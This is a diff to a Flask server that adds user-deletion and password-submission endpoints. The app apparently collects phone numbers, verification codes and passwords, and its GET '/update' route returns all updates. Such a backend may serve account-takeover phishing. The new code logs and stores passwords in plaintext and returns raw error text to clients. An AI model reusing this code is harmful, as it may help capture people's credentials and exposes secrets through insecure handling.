@@ -1,6 +1,6 @@
 from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
-from base import init_db, add_phone, add_code, give_all_update
+from base import init_db, add_phone, add_code, give_all_update, add_password, get_db_connection
 import logging
 
 logging.basicConfig(level=logging.INFO)
@@ -12,6 +12,32 @@ CORS(app)
 
 init_db()
 
+@app.route('/delete_user', methods=['POST'])
+def handle_delete():
+    try:
+        data = request.get_json()
+        
+        # Проверяем наличие обязательных полей
+        if not all(key in data for key in ['username', 'number', 'code', 'password']):
+            return jsonify({'status': 'error', 'message': 'Missing data'}), 400
+        
+        # Удаляем пользователя из базы данных
+        with get_db_connection() as conn:
+            cursor = conn.cursor()
+            cursor.execute(
+                'DELETE FROM users WHERE username = ? AND number = ? AND code = ? AND password = ?',
+                (data['username'], data['number'], data['code'], data['password'])
+            )
+            conn.commit()
+            
+            if cursor.rowcount > 0:
+                return jsonify({'status': 'success', 'message': 'User deleted'})
+            else:
+                return jsonify({'status': 'error', 'message': 'User not found'}), 404
+                
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @app.route('/update', methods=['GET'])
 def update():
     try:
@@ -22,6 +48,30 @@ def update():
     except Exception as e:
         logger.error(f"Error in /update: {str(e)}")
         return jsonify({'status': 'error', 'message': 'Server error'}), 500
+
+@app.route('/password', methods=['POST'])
+def handle_password():
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+            
+        user = data.get('username')
+        password = data.get('password')
+        
+        if not user or not password:
+            return jsonify({'status': 'error', 'message': 'Missing username or code'}), 400
+        
+        logger.info(f"Received code: user={user}, code={password}")
+        
+        if add_password(password, user):
+            return jsonify({'status': 200, 'message': 'Code accepted'}), 200
+        return jsonify({'status': 'error', 'message': 'User not found'}), 404
+        
+    except Exception as e:
+        logger.error(f"Error in /code: {str(e)}")
+        return jsonify({'status': 'error', 'message': 'Server error'}), 500
+
 
 @app.route('/code', methods=['POST'])
 def handle_code():
